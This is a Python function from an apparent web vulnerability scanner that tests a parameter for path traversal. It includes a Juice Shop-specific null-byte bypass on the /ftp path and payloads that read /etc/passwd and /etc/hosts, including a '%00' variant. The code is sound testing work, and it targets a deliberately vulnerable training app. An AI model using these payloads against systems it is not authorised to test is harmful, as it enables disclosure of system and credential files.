from utils.rate_limiter import rate_limited_request

def test_traversal(session, url, param, base_url=None):
    """
    Test for Path Traversal vulnerability.
    Supports Juice Shop FTP path-based traversal.
    
    Returns:
        dict with: vulnerable (bool), confidence (HIGH/MEDIUM/LOW), evidence (str)
    """
    
    # Juice Shop FTP path-based traversal (no parameters)
    if base_url and "juiceshop" in base_url.lower():
        ftp_paths = [
            "/ftp/package.json.bak%2500.md",  # Null byte bypass
            "/ftp/../package.json",            # Directory traversal
            "/ftp/package.json.bak",           # Direct file access
        ]
        
        for test_path in ftp_paths:
            ftp_url = base_url + test_path
            response = rate_limited_request(session, "GET", ftp_url, params={})
            
            if response and response.status_code == 200:
                if len(response.text) > 100 and "{" in response.text:
                    if "name" in response.text.lower() and "version" in response.text.lower():
                        return {
                            "vulnerable": True,
                            "confidence": "HIGH",
                            "evidence": f"Accessed protected file via FTP: {test_path}",
                            "payload": test_path
                        }
    
    # Try Linux paths first
    payload = "../../../../../../etc/passwd"
    response = rate_limited_request(session, "GET", url, params={param: payload})
    
    if response is None:
        return {"vulnerable": False, "confidence": "NONE", "evidence": "Request failed"}
    
    # HIGH confidence: Found /etc/passwd content
    if "root:" in response.text and ":" in response.text:
        # Count colons to verify it looks like passwd format (user:x:uid:gid...)
        lines_with_colons = [line for line in response.text.split('\n') if line.count(':') >= 3]
        if len(lines_with_colons) >= 3:
            return {
                "vulnerable": True,
                "confidence": "HIGH",
                "evidence": "Read /etc/passwd file (contains user accounts)",
                "payload": payload
            }
    
    # Try /etc/hosts (more commonly readable)
    payload2 = "../../../../../../etc/hosts"
    response2 = rate_limited_request(session, "GET", url, params={param: payload2})
    
    if response2:
        if "localhost" in response2.text.lower() and "127.0.0.1" in response2.text:
            return {
                "vulnerable": True,
                "confidence": "HIGH",
                "evidence": "Read /etc/hosts file",
                "payload": payload2
            }
    
    # MEDIUM confidence: Try null byte bypass (older systems)
    payload3 = "../../../../../../etc/passwd%00"
    response3 = rate_limited_request(session, "GET", url, params={param: payload3})
    
    if response3 and "root:" in response3.text:
        return {
            "vulnerable": True,
            "confidence": "HIGH",
            "evidence": "Read /etc/passwd using null byte bypass",
            "payload": payload3
        }
    
    # LOW confidence: Check if ../ is reflected or causes different response
    normal = rate_limited_request(session, "GET", url, params={param: "test.txt"})
    traversal = rate_limited_request(session, "GET", url, params={param: "../test.txt"})
    
    if normal and traversal:
        if len(traversal.text) != len(normal.text):
            return {
                "vulnerable": True,
                "confidence": "LOW",
                "evidence": f"Path traversal changes response (may need manual verification)",
                "payload": "../test.txt"
            }
    
    return {"vulnerable": False, "confidence": "NONE", "evidence": "Could not read files outside web directory"}
